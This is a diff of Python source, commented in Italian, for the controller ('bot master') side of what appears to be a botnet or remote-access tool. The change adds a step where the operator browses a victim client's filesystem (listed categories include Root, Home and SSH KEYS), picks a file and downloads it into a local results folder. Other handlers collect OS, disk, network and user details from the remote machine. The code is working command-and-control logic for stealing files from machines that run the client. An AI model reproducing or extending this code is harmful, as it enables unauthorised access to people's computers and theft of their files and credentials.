@@ -27,9 +27,12 @@ __headers_type = {"1": b"<File-Name>", "1-1": b"<File-Content>", "1-2": b"<File-
                   "6": b"<Partition-disk-status>", "6-1": b"<Partition-disk-read-status>", "6-2": b"<Partition-disk-write-status>",
                   "7": b"<Network-info>", "7-1": b"<Network-Interface>", "7-2": b"<Network-IP>", "7-3": b"<Network-NetMask>", "7-4": b"<Network-Broadcast>",
                   "8": b"<Users>", "8-1": b"<Users-Name>", "8-2": b"<Users-Active-Since>",
-                  "9": b"<Content-Path>"}
+                  "9": b"<Content-Path>",
+                  "10": b"<Waiting-For-File>"}
 
 __filesystem_hierarchy_components = {"1": "Root", "2": "Home", "3": "SSH KEYS", "4": "Images", "5": "Documents"}  # TODO: Probabile convenga modificare la Root con qualcosa di meno intensive
+
+content_dir = []
 
 __buffer_size = 8192
 
@@ -50,13 +53,13 @@ async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.Stream
             await ask_operation(writer)
         else:
             addr, port = writer.get_extra_info("peername")
-            await handle_response(response, addr, port)  # Gestiamo automaticamente le richieste di ricezione file/informazioni sullo stato della macchina
+            await handle_response(response, writer, addr, port)  # Gestiamo automaticamente le richieste di ricezione file/informazioni sullo stato della macchina
         await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
     writer.close()
     await writer.wait_closed()  # Attendiamo che il client sia chiuso prima di stoppare
 
 
-async def handle_response(response: bytes, addr: str, port: int) -> None:
+async def handle_response(response: bytes, writer: asyncio.StreamWriter, addr: str, port: int) -> None:
     """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
     # Sarebbe stato preferibile utilizzare un case statement ma non è possibile utilizzando startswith
     if response.startswith(__headers_type["1"]):  # Recupero file
@@ -73,10 +76,15 @@ async def handle_response(response: bytes, addr: str, port: int) -> None:
         print(f'Il file richiesto {re.split(__headers_type["1-2"], response)[1].decode()} al client è inesistente')  # Decoding del nome del file in place
 
     elif response.startswith(__headers_type["2"]):  # Informazioni sul tipo di OS
-        print(f'OS-TYPE: {re.split(__headers_type["2"], response)[1].decode()}')  # Decoding del nome del file in place
+        print(f'OS-TYPE: {re.split(__headers_type["2"], response)[1].decode()}')
 
     elif response.startswith(__headers_type["9"]):  # Recupero contenuto di una directory -> Definite in __filesystem_hierarchy_components
         print(f'File: {re.split(__headers_type["9"], response)[1].decode()}')  # Decoding del nome del file in place
+        content_dir.append(re.split(__headers_type["9"], response)[1].decode())
+
+    elif response.startswith(__headers_type["10"]):  # Recupero contenuto di una directory -> Definite in __filesystem_hierarchy_components
+        # print(f'File: {}')  # Decoding del nome del file in place
+        await ask_file_name_to_download(writer)
     else:
         msg = response.decode()
         print(f"Messaggio da {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)
@@ -84,7 +92,7 @@ async def handle_response(response: bytes, addr: str, port: int) -> None:
 
 async def handle_response_for_files(filename: str, content) -> None:
     """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
-    async with aiofiles.open(filename, "ab+") as file:
+    async with aiofiles.open(b"./result/" + filename, "ab+") as file:  # TODO: Trovare un modo più gestibile
         await file.write(content)  # Salviamo nel file il contenuto ricevuto dal client già formattato
 
 
@@ -113,14 +121,31 @@ async def ask_operation(writer: asyncio.StreamWriter) -> None:
         loop.close()
 
 
+async def ask_file_name_to_download(writer: asyncio.StreamWriter) -> None:
+    """Gestione della richiesta del recupero di un file presente sulla macchina dove viene eseguito il client."""
+    bot_master_utils.print_menu_with_list(content_dir, "Path disponibili:", 70)
+    try:
+        index = await ainput(">>> ")
+        request = int(index)
+        if 0 <= request < len(content_dir):
+            chosen_file = content_dir[request]
+            print(f"Operazione scelta {request} -> {chosen_file}")
+            writer.write(__response_options["8"].encode() + chosen_file.encode())
+            # TODO: Svuotare la lista nel caso in cui non si fosse chiesto il download di tutti i file
+        else:
+            print("Out of range")
+    except Exception as e:
+        bot_master_utils.info(f"{type(e)}: {e}", 2)
+
+
 async def ask_content_path(writer: asyncio.StreamWriter) -> None:
-    """Gestione della richiesta del contenuto del FS della macchina su cui gira il client."""
+    """Gestione della richiesta del contenuto del FS della macchina su cui viene eseguito il client."""
     bot_master_utils.print_menu(__filesystem_hierarchy_components, "Path disponibili:", 32)
     try:
         request = await ainput(">>>> ")
         if request in __filesystem_hierarchy_components.keys():
             print(f"Operazione selezionata: {request}")
-            chosen_operation = __response_options["10"] + __filesystem_hierarchy_components.get(request)  # TODO: Modificare i values delle response in accordo con gli headers_type
+            chosen_operation = __response_options["9"] + __filesystem_hierarchy_components.get(request)
             writer.write(chosen_operation.encode())
     except Exception as e:
         #  TODO: In caso di eccezione ritornare (?)
